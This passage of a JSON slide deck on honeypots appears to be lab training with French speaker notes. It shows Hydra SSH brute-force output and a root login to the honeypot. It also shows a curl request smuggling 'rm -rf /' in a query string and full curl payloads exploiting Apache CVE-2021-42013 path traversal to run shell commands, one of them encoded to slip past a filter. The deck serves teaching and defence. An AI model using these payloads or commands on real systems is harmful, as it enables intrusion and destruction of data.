monkey\n[2222][ssh] host: 172.17.0.3   login: sslh   password: monkey\n[2222][ssh] host: 172.17.0.3   login: stunnel4   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sym   password: monkey\n[2222][ssh] host: 172.17.0.3   login: symop   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sssd   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sys   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sync   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sysadm   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sysadmin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: syslog   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sysbin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: system_admin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: systemd-coredump   password: monkey\n[2222][ssh] host: 172.17.0.3   login: systemd-network   password: monkey\n[2222][ssh] host: 172.17.0.3   login: systemd-bus-proxy   password: monkey\n[2222][ssh] host: 172.17.0.3   login: systemd-resolve   password: monkey\n[2222][ssh] host: 172.17.0.3   login: systemd-timesync   password: monkey\n[2222][ssh] host: 172.17.0.3   login: ubuntu   password: monkey\n[2222][ssh] host: 172.17.0.3   login: tss   password: monkey\n[2222][ssh] host: 172.17.0.3   login: udadmin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: tcpdump   password: monkey\n[2222][ssh] host: 172.17.0.3   login: umountfsys   password: monkey\n[2222][ssh] host: 172.17.0.3   login: trouble   password: monkey\n[2222][ssh] host: 172.17.0.3   login: ultra   password: monkey\n[2222][ssh] host: 172.17.0.3   login: umountfs   password: monkey\n[2222][ssh] host: 172.17.0.3   login: umountsys   password: monkey\n[2222][ssh] host: 172.17.0.3   login: unix   password: monkey\n[2222][ssh] host: 172.17.0.3   login: unscd   password: monkey\n[2222][ssh] host: 172.17.0.3   login: us_admin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: uucp   password: monkey\n[2222][ssh] host: 172.17.0.3   login: usbmux   password: monkey\n[2222][ssh] host: 172.17.0.3   login: uucpadm   password: monkey\n[2222][ssh] host: 172.17.0.3   login: user   password: monkey\n[2222][ssh] host: 172.17.0.3   login: uuidd   password: monkey\n[2222][ssh] host: 172.17.0.3   login: vagrant   password: monkey\n[2222][ssh] host: 172.17.0.3   login: varnish   password: monkey\n[2222][ssh] host: 172.17.0.3   login: web   password: monkey\n[2222][ssh] host: 172.17.0.3   login: webmaster   password: monkey\n[2222][ssh] host: 172.17.0.3   login: whoopsie   password: monkey\n[2222][ssh] host: 172.17.0.3   login: www   password: monkey\n[2222][ssh] host: 172.17.0.3   login: www-data   password: monkey\n[2222][ssh] host: 172.17.0.3   login: xpdb   password: monkey\n[2222][ssh] host: 172.17.0.3   login: xpopr   password: monkey\n[2222][ssh] host: 172.17.0.3   login: zabbix   password: monkey\n1 of 1 target successfully completed, 175 valid passwords found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-02 09:55:20\n                                                                                                                                                                                                                                            \n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+            "code lang": "bash"
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise 3: Exploit the Honeypot",
+            "notes": [
+                "Parfois les attaquants utilisent un honeypot pour faire des actions, essayez d'utiliser le honeypot pour faire des actions qui vous int\u00e9resseraient en tant qu'attaquant."
+            ],
+            "aside": "References: <a href=\"https://www.sciencedirect.com/science/article/pii/S1389128625002944\">SMASH: An SDN-MTD framework for efficient honeypot deployment and insider threat mitigation (2025)</a>.",
+            "image": "nmap_ssh_bruteforce.jpg",
+            "image alt": "Nmap brute force attack demonstration against a honeypot SSH service showing simulated attacker activity",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Compromise the honeypot by applying the techniques and actions a real attacker would use after identifying it as a honeypot."
+                }
+            ],
+            "code": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh root@172.17.0.2 -p 2222\n** WARNING: connection is not using a post-quantum key exchange algorithm.\n** This session may be vulnerable to \"store now, decrypt later\" attacks.\n** The server may need to be upgraded. See https://openssh.com/pq.html\nroot@172.17.0.2's password: \n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nroot@svr04:~# curl 'http://example.com/?cmd=rm%20-rf%20/' \n<!doctype html><html lang=\"en\"><head><title>Example Domain</title><link rel=\"icon\" href=\"data:,\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><style>body{background:#eee;width:60vw;margin:15vh auto;font-family:system-ui,sans-serif}h1{font-size:1.5em}div{opacity:0.8}a:link,a:visited{color:#348}</style></head><body><div><h1>Example Domain</h1><p>This domain is for use in documentation examples without needing permission. Avoid use in operations.</p><p><a href=\"https://iana.org/domains/example\">Learn more</a></p></div></body></html>\nroot@svr04:~#",
+            "code lang": "bash"
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise 4: Bypass the Honeypot",
+            "notes": [
+                "Maintenant tentez de bypasser la protection/\u00e9mulation que j'ai mise sur mon honeypot de haute interaction (volontairement vuln\u00e9rable)."
+            ],
+            "aside": "References: <a href=\"https://honeynet.onofri.org/papers/honeynet/index.html\">Honeynet</a>.",
+            "image": "exploit_blocked.jpg",
+            "image alt": "Screenshot of a high-interaction honeypot detecting and blocking a vulnerability exploitation attempt with a security protection system",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Find ways to detect, avoid, or bypass the honeypot's monitoring mechanisms."
+                }
+            ],
+            "code": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ python3 exploit_apache.py 127.0.0.1:8080 -c 'uname -a'\n\nCVE-2021-42013  Copyright (C) 2022  Maurice Lambert\nThis program comes with ABSOLUTELY NO WARRANTY.\nThis is free software, and you are welcome to redistribute it\nunder certain conditions.\n\n\nPythonToolsKit  Copyright (C) 2022, 2023  Maurice Lambert\nThis program comes with ABSOLUTELY NO WARRANTY.\nThis is free software, and you are welcome to redistribute it\nunder certain conditions.\n\n[+] Target is vulnerable.\n[-] Exploit is not working (HTTP error 403).\n                                                                                                                                                                                                                                            \n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -v -X POST 'http://127.0.0.1:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain;echo;uname -a'\nNote: Unnecessary use of -X or --request, POST is already inferred.\n*   Trying 127.0.0.1:8080...\n* Established connection to 127.0.0.1 (127.0.0.1 port 8080) from 127.0.0.1 port 37758 \n* using HTTP/1.x\n> POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/8.19.0\n> Accept: */*\n> Content-Length: 43\n> Content-Type: application/x-www-form-urlencoded\n> \n* upload completely sent off: 43 bytes\n* HTTP 1.0, assume close after body\n< HTTP/1.0 403 Forbidden\n< Server: Apache/2.4.49 Python/3.13.12\n< Date: Mon, 03 Aug 2026 19:51:32 GMT\n< Content-Type: text/html\n< Content-Length: 130\n< \n<html>\n<head><title>403 Forbidden</title></head>\n<body>\n<center><h1>403 Forbidden</h1></center>\n<hr>\nApache/2.4.49\n</body>\n* shutting down connection #0\n</html>                                                                                                                                                                                                                                            \n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -v -X POST 'http://127.0.0.1:8080/cg%69-b%69n/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain;echo;uname -a'\nNote: Unnecessary use of -X or --request, POST is already inferred.\n*   Trying 127.0.0.1:8080...\n* Established connection to 127.0.0.1 (127.0.0.1 port 8080) from 127.0.0.1 port 51728 \n* using HTTP/1.x\n> POST /cg%69-b%69n/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/8.19.0\n> Accept: */*\n> Content-Length: 43\n> Content-Type: application/x-www-form-urlencoded\n> \n* upload completely sent off: 43 bytes\n* HTTP 1.0, assume close after body\n< HTTP/1.0 200 OK\n< Server: Apache/2.4.49 Python/3.13.12\n< Date: Mon, 03 Aug 2026 19:51:46 GMT\n< Date: Mon, 03 Aug 2026 19:51:46 GMT\n< Server: Apache/2.4.50 (Unix)\n< Content-Type: text/plain\n< \nLinux 4eca5f5b971b 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1 (2026-02-25) x86_64 GNU/Linux\n* shutting down connection #0\n                                                                                                                                                                                                                                            \n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+            "code lang": "bash"
+        },
+        {
+            "type": "title",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Conclusion: Honeypots Turning Attacks into Cybersecurity Intelligence",
+            "notes": [
+                "Pour conclure sur cette pr\u00e9sentation sur les honeypots."
+            ]
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Key Takeaways: The Role and Limits of Honeypots",
+            "notes": [
+                "Un honeypot est un outil de d\u00e9fense mais qui n'est pas un outil de blocage, c'est un syst\u00e8me vuln\u00e9rable pour observer le comportement d'un attaquant.",
+                "On peut faire de la CTI avec un honeypot, c'est l'un des principaux cas d'usage.",
+                "La CTI fonctionne selon la qualit\u00e9 du honeypot, pour observer des attaques inconnues ou tr\u00e8s \u00e9volu\u00e9es il faudra un honeypot tr\u00e8s r\u00e9aliste.",
+                "Restez vigilant si vous d\u00e9ployez un honeypot car c'est dangereux d'introduire des attaquants sur vos machines."
+            ],
+            "aside": "References: <a href=\"https://www.cert.ssi.gouv.fr/actualite/CERTFR-2014-ACT-018\">Honeypot a detection tool</a>.",
+            "image": "conf_honeypot.jpg",
+            "image alt": "Cybersecurity cartoon showing a cat monitoring a digital honeypot where an electronic bee is trapped inside a virtual honey jar",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "A honeypot does not block attackers, it attracts them to <strong>observe their actions</strong> and collect valuable intelligence."
+                },
+                {
+                    "type": "p",
+                    "content": "It <strong>provides visibility into threats</strong>, attacker techniques, tools, and behaviors that would otherwise remain unknown."
+                },
+                {
+                    "type": "p",
+                    "content": "Its <strong>effectiveness depends on the quality of the deployment</strong>, the realism of the environment, and proper monitoring."
+                },
+                {
+                    "type": "p",
+                    "content": "Honeypots are valuable tools for threat detection, cybersecurity research, and training, but they must be deployed carefully because a <strong>compromised honeypot can create security risks</strong>."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        }
+    ]
+}
